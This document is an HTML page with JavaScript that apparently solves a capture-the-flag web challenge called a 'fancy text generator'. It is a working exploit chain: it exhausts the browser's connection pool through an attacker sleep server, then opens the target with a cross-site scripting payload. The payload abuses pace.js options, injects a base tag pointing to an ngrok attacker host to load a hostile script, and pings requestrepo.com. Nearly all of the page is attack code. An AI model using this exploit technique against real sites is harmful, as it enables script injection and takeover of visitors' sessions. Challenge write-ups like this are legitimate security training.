<textarea id="log" style="width: 100%; height: 300px;"></textarea>
<script>
    SOCKETLIMIT = 255;
    MYSERVER = `xxxxxxx.xxxxxxxxxxxxxxx.xxx` // eg. sleep.attacker.com
    TARGET = "https://fancy-text-generator-web.shared.challs.mt/"

    let errors = 0;
    let done = 0;

    const logtextarea = document.getElementById("log");

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }

    const loadFont = (fontName, fontUrl) => {
        const font = new FontFace(fontName, `url(${fontUrl})`);

        font.load().then((loadedFont) => {
            document.fonts.add(loadedFont);
        })
    };

    const log = (l, type = 'INFO') => {
        logtextarea.value += `${l}\n`;
        logtextarea.scrollTop = logtextarea.scrollHeight;
    }

    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;

        fetch(`https://sleep${i}.${MYSERVER}/360?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        }).catch(() => {
            errors++;
        });

        done++;

        return controller
    }

    const clear_log = () => {
        logtextarea.value = '';
    }

    const block_socket = async (i) => {
        fetch_sleep_long(i);
        await sleep(0);
    }

    const exhaust_sockets = async() => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            block_socket(i);
        }
    }

    
    let block;
    async function main(){
        let start = performance.now();

        await sleep(100);
        await exhaust_sockets();

        fetch("/exhausted");

        await sleep(5000);
        
        payload = `<script integrity=sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ= src=/loader.js crossorigin=anonymous><\/script>`;
        payload = `<p>a</p><style>@import 'https://s8lhs4o1.requestrepo.com/'</style><img id="data-pace-options" data-pace-options='{"className": "\\"><base href=https://f8ba-93-148-124-4.ngrok-free.app/><iframe srcdoc=\\"${payload}\\"></iframe>","target":"body"}'><img src=https://f8ba-93-148-124-4.ngrok-free.app/test>`;

        fetch(`/?errors=${errors}&done=${done}`)

        w = window.open(`${TARGET}?text=${encodeURIComponent(payload)}`, "gg", "width=800,height=600");

        await sleep(50);

        block = fetch_sleep_long(1337);


        await sleep(1000);

        quick();

        await sleep(1000);

        quick();

        await sleep(1000);

        free();
        fetch("/done")

    }

    function quick(){
        block.abort();
        block = fetch_sleep_long(1337);
    }

    function free(){
        block.abort();
    }

    function occupy(){
        block.abort();
    }

    main();
</script>

<button onclick="quick()" >quick</button>
<button onclick="occupy()" >Occupy</button>
<button onclick="free()" >free</button>
